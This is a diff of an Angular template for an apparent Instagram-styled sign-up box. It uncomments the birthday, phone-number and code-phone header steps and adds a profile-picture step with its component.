@@ -13,26 +13,16 @@
                                                 <div class="login-box">
                                                     <!-- HEADER -->
                                                         <div class="header">
-                                                            <!-- <ng-container *ngIf="this.showAccount; else birthDay">
+                                                            <ng-container *ngIf="this.showAccount">
                                                                 <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" />
                                                             </ng-container>
-                                                            <ng-template #birthDay>
-                                                                <ng-container *ngIf="this.showBirthDay; else phoneNumber">
-                                                                    <span class="_9-zu _aa5a"></span>    
-                                                                </ng-container>
-                                                                <ng-template #phoneNumber>
-                                                                    <ng-container *ngIf="this.showPhoneNumber; else codePhone">
-                                                                        <span class="_9--f _aa5a"></span>
-                                                                    </ng-container>
-                                                                    <ng-template #codePhone>
-                                                                        <span  class="_9--v _aa5a"></span>
-                                                                    </ng-template>
-                                                                </ng-template>
-                                                            </ng-template> -->
-                                                           
 
-                                                            <!-- <ng-container *ngIf="this.showBirthDay">
+                                                            <ng-container *ngIf="this.showBirthDay">
                                                                 <span class="_9-zu _aa5a"></span>
+                                                            </ng-container>
+
+                                                            <ng-container *ngIf="this.showProfilePicture">
+                                                                <span  class="_9--v _aa5a"></span>
                                                             </ng-container>
 
                                                             <ng-container *ngIf="this.showPhoneNumber">
@@ -41,7 +31,7 @@
 
                                                             <ng-container *ngIf="this.showCodePhone">
                                                                 <span  class="_9--v _aa5a"></span>
-                                                            </ng-container> -->
+                                                            </ng-container>
                                                         </div>
                                                     <!-- HEADER END-->
 
@@ -60,6 +50,13 @@
                                                                 -->
                                                                 <ng-container *ngIf="this.showBirthDay">
                                                                     <app-birthday (showCodePhoneEvent)="showViewNumberPhone($event)" (backEvent)="backAccount($event)" [user]="user" ></app-birthday>
+                                                                </ng-container>
+
+                                                                <!-- 
+                                                                    PROFILE PICTURE
+                                                                -->
+                                                                <ng-container *ngIf="this.showProfilePicture">
+                                                                    <app-profile-picture></app-profile-picture>
                                                                 </ng-container>
 
                                                                 <!-- 
